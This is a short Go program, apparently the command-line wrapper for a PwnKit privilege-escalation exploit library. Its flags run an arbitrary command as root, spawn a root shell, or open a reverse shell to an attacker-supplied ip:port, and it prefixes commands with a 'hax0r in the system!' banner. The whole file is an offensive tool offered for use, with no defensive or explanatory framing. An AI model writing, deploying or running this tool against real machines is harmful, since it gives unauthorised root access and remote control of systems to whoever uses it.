package main

import (
	"flag"
	"fmt"
	"github.com/OXDBXKXO/go-PwnKit"
)

func main() {
	cmd := flag.String("c", "", "Command to execute as root")
	shell := flag.Bool("s", false, "Spawn a root shell")
	reverseShell := flag.String("r", "", "Open a reverse-shell instead. Format: ip:port")
	flag.Parse()

	var err error
	if *reverseShell != "" {
		gopwnkit.RevShell(*reverseShell)
	} else if *cmd != "" {
		gopwnkit.Command("id; echo \"hax0r in the system!\";" + *cmd)
	} else if *shell {
		gopwnkit.Shell()
	} else {
		flag.Usage()
	}

	if err != nil {
		fmt.Println(err)
	}
}
